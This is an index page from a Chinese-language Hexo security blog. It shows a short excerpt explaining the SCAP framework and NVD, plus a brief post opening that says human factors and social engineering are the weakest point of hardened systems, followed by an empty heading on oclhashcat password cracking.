<h4 id="SCAP-Security-Content-Automation-Protocol"><a href="#SCAP-Security-Content-Automation-Protocol" class="headerlink" title="SCAP(Security Content Automation Protocol)"></a>SCAP(Security Content Automation Protocol)</h4><p>SCAP是一个集合了多种安全标准的框架，它共有六个子元素:CVE,OVAL,CCE,CPE,CVSS,XCCDF。其目的是以标准的方法展示和操作安全数据。有NIST负责维护。</p>
<p>框架是个很有效率的东西，美国人民很擅长做框架的东西，因为一般只要完成了框架里所要求的事情，基本上就很规范了。所以，SCAP是当前美国比较成熟的一套信息安全评估标准体系，其标准化，自动化的思想对信息安全行业产生了深远的影响。</p>
<p>SCAP主要解决三个问题:</p>
<ul>
<li>实现高层政策法规等到底层实施的落地。</li>
<li>将信息安全所涉及的各个要素标准化。</li>
<li>将复杂的系统配置核查工作自动化。</li>
</ul>
<p>由于SCAP太完美，太细致啦，所以太复杂了，目前这个星球上完全安装按照SCAP标准去干的，只有NVD(National Vulnerabiliy Database:美国国家漏洞管理标准数据)一家。</p>
<p>NVD:<a href="https://nvd.nist.gov/" target="_blank" rel="noopener">https://nvd.nist.gov/</a></p>
<p>nvd的CheckList是很好用的。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/15/思维初步/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="onejustonee">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="onejustone">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/06/15/思维初步/" itemprop="url">思维初步</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-06-15T10:30:00+08:00">
                2016-06-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/technology/" itemprop="url" rel="index">
                    <span itemprop="name">technology</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>如果一个目标系统实施了强安全措施，即对方安装了所有补丁，无任何已知漏洞，无应用层漏洞，攻击面最小化，即是不开一切可有可无的端口等等，可以说毫无缝隙，那么此时是否就无计可施？</p>
<p>其实最大的不安全因素永远人类自己，技术反而不那么重要，此时，社会工程学将发挥无法抗拒的力量。</p>
<hr>
<h3 id="离线密码破解-oclhashcat"><a href="#离线密码破解-oclhashcat" class="headerlink" title="离线密码破解-oclhashcat"></a>离线密码破解-oclhashcat</h3>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/24/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><span class="page-number current">25</span><a class="page-number" href="/page/26/">26</a><span class="space">&hellip;</span><a class="page-number" href="/page/33/">33</a><a class="extend next" rel="next" href="/page/26/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">onejustonee</p>
              <p class="site-description motion-element" itemprop="description">onejustone's blog</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">329</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">categories</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">103</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">onejustonee</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
